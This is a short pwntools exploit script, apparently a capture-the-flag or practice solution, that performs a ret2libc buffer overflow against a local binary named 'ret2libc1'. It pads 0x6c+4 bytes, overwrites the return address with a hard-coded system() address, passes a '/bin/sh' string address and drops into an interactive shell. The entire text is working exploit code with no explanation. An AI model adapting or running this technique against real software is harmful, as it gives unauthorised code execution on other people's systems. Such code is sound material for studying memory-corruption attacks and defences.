from pwn import *

system_addr = 0x08048460
sh_addr = 0x08048720
offset = 0x6c + 4
pyload = b'a' * offset + p32(system_addr) +p32(0xdeadbeef) + p32(sh_addr)
sh = process('./ret2libc1')
sh.sendline(pyload)
sh.interactive()
